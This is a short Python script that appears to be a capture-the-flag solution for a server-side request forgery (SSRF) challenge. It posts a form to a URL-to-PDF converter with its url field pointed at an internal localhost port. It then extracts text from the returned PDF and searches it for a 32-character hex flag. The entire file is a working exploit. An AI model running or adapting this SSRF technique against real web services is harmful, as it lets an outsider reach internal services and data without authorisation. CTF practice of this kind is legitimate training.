import io
import re
import requests
from pypdf import PdfReader

URL = "http://utils.edu.stf/convert.php"
Payload = "http://127.0.0.1:9732"

def ssrf_solve():
    from_data = {
            "file": ("", "", "application/octet-stream"),
            "url": (None, Payload),
        }

    try:

        response = requests.post(
                URL, files=from_data, timeout=10
            )
        if response.status_code == 200:
            pdf_file = io.BytesIO(response.content)
            reader = PdfReader(pdf_file)

            extracted_text = ""
            for page in reader.pages:
                text = page.extract_text()
                if text:
                    extracted_text += text + "\n"

            clean_text = extracted_text.strip()

            flag_match = re.search(r"\b[a-fA-F0-9]{32}\b", extracted_text)

            if flag_match:
                print(f"{flag_match.group(0)}")
            else:
                print(extracted_text.strip())
        else:
            print(f"[X] Ошибка сервера: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"Ошибка подключения: {e}")
    except Exception as e:
        print(f"Ошибка парсинга PDF: {e}")

if __name__ == "__main__":
    ssrf_solve()
